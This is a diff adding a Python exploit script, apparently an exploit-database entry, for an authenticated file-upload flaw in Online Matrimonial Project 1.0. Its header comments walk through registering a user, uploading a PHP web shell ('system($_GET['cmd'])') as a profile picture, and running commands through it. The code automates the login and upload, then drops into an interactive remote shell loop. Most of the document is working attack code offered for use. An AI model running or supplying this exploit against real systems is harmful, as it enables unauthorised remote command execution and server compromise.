@@ -1,0 +1,94 @@
+# Exploit Title: Online Matrimonial Project 1.0 - Authenticated Remote Code Execution
+# Exploit Author: Valerio Alessandroni
+# Date: 2020-10-07
+# Vendor Homepage: https://projectworlds.in/
+# Software Link: https://projectworlds.in/free-projects/php-projects/online-matrimonial-project-in-php/
+# Source Link: https://github.com/projectworldsofficial/online-matrimonial-project-in-php
+# Version: 1.0
+# Tested On: Server Linux Ubuntu 18.04, Apache2
+# Version: Python 2.x
+# Impact: Code Execution
+# Affected components: Affected move_uploaded_file() function in functions.php file.
+# Software: Marital - Online Matrimonial Project In PHP version 1.0 suffers from a File Upload Vulnerability allowing Remote Attackers to gain Remote Code Execution (RCE) on the Hosting Webserver via uploading a maliciously crafted PHP file.
+# Attack vector: An authenticated (you can register a user for free) not privileged user is able to upload arbitrary file in the upload form used to send profile pics, if the file is a PHP script, it can be executed.
+#
+# Additional information:
+#
+# To exploit this vulnerability:
+# 1) register a not privileged user at /register.php
+# 2) login in the application /login.php
+# 3) keep note of the redirect with the GET 'id' parameter  /userhome.php?id=[ID]
+# 4) go to the page /photouploader.php?id=[ID]
+# 5) upload an arbitrary file in the upload form, in my example, I used a file called shell.php with the content of "<?php system($_GET['cmd']); ?>"
+# 6) An error will occurr, but the file is correctly uploaded at /profile/[ID]/shell.php
+# 7) run command system command through /profile/[ID]/shell.php?cmd=[COMMAND]
+#
+# How to use it:
+# python exploit.py [URL] [USERNAME] [PASSWORD]
+
+
+import requests, sys, urllib, re, time
+from colorama import Fore, Back, Style
+requests.packages.urllib3.disable_warnings(requests.packages.urllib3.exceptions.InsecureRequestWarning)
+
+def webshell(SERVER_URL, ID, FILE_NAME):
+    try:
+        print(Fore.YELLOW+'[+] '+Fore.RESET+'Connecting to webshell...')
+        time.sleep(1)
+        WEB_SHELL = SERVER_URL+'profile/'+ID+'/'+FILE_NAME
+        getCMD  = {'cmd': 'echo ciao'}
+        r2 = requests.get(WEB_SHELL, params=getCMD)
+        status = r2.status_code
+        if status != 200:
+            print(Style.BRIGHT+Fore.RED+"[!] "+Fore.RESET+"Could not connect to the webshell."+Style.RESET_ALL)
+            r2.raise_for_status()
+        print(Fore.GREEN+'[+] '+Fore.RESET+'Successfully connected to webshell.')
+        while True:
+             
+             inputCMD = raw_input('$ ')
+             command = {'cmd': inputCMD}
+             r2 = requests.get(WEB_SHELL, params=command, verify=False)
+             print r2.text
+    except:
+        print("\r\nExiting.")
+        sys.exit(-1)
+
+def printHeader():
+     print(Fore.GREEN+"___  ___              _  _          _ "+Fore.RED+"     ______  _____  _____")
+     print(Fore.GREEN+"|  \/  |             (_)| |        | |"+Fore.RED+"     | ___ \/  __ \|  ___|")
+     print(Fore.GREEN+"| .  . |  __ _  _ __  _ | |_  __ _ | |"+Fore.RED+"     | |_/ /| /  \/| |__  ")
+     print(Fore.GREEN+"| |\/| | / _` || '__|| || __|/ _` || |"+Fore.RED+"     |    / | |    |  __| ")
+     print(Fore.GREEN+"| |  | || (_| || |   | || |_| (_| || |"+Fore.RED+"     | |\ \ | \__/\| |___ ")
+     print(Fore.GREEN+"\_|  |_/ \__,_||_|   |_| \__|\__,_||_|"+Fore.RED+"     \_| \_| \____/\____/ ")
+     print ''                                                       
+
+
+
+if __name__ == "__main__":
+    printHeader()
+    if len(sys.argv) != 4:
+        print (Fore.YELLOW+'[+] '+Fore.RESET+"Usage:\t python %s [URL] [USERNAME] [PASSWORD]" % sys.argv[0])
+        print (Fore.YELLOW+'[+] '+Fore.RESET+"Example:\t python %s https://192.168.1.1:443/marital/ Thomas password1234" % sys.argv[0])
+        sys.exit(-1)
+    SERVER_URL = sys.argv[1]
+    SERVER_URI = SERVER_URL + 'auth/auth.php'
+    LOGIN_PARAMS = {'user': '1'}
+    LOGIN_DATA = {'username': sys.argv[2], 'password': sys.argv[3], 'op': 'Log in'}
+    req = requests.post(SERVER_URI, params=LOGIN_PARAMS, data=LOGIN_DATA, verify=False)
+    print(Fore.YELLOW+'[+] '+Fore.RESET+'logging...')
+    time.sleep(1)
+    for resp in req.history:
+        COOKIES = resp.cookies.get_dict()
+        SPLITTED = resp.headers["location"].split("=")
+        ID = SPLITTED[1]
+    print(Fore.GREEN+'[+] '+Fore.RESET+'Successfully retrieved user [ID].')
+    time.sleep(1)
+    SERVER_URI = SERVER_URL + 'photouploader.php'
+    LOGIN_PARAMS = {'id': ID}
+    LOGIN_DATA = {'username': sys.argv[2], 'password': sys.argv[3], 'op': 'Log in'}
+    FILE_NAME = 'shell.php'
+    FILES = {'pic1': (FILE_NAME, '<?php system($_GET[\'cmd\']); ?>'), 'pic2': ('', ''), 'pic3': ('', ''), 'pic4': ('', '')}
+    req = requests.post(SERVER_URI, params=LOGIN_PARAMS, files=FILES, cookies=COOKIES, verify=False)
+    print(Fore.GREEN+'[+] '+Fore.RESET+'Successfully uploaded.')
+    time.sleep(1)
+    webshell(SERVER_URL, ID, FILE_NAME)
